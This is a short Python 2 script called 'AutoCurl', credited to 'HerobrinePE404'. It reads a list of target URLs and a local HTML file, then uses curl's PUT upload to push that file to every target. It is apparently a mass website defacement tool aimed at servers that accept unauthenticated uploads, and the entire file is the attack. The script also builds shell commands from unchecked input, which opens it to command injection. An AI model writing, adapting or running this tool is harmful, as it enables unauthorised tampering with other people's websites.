#!usr/bin/python2
import os,sys,time
# Restart ####################
def restart():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################
# Set Colors ######
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
##################
os.system("clear")
print "%s[HerobrinePE404]"%(W)
os.system("figlet AutoCurl | lolcat")
print "%s------------------%s"%(G,W)
daftar=raw_input("Daftar Target > ")
sc=raw_input("Path Script Html > ")
daf=open(daftar,"r")
dfr=daf.readlines()
print "[+] ",daf
for x in dfr:
	print "Tes: ",x
	os.system("curl -T %s %s"%(sc,x))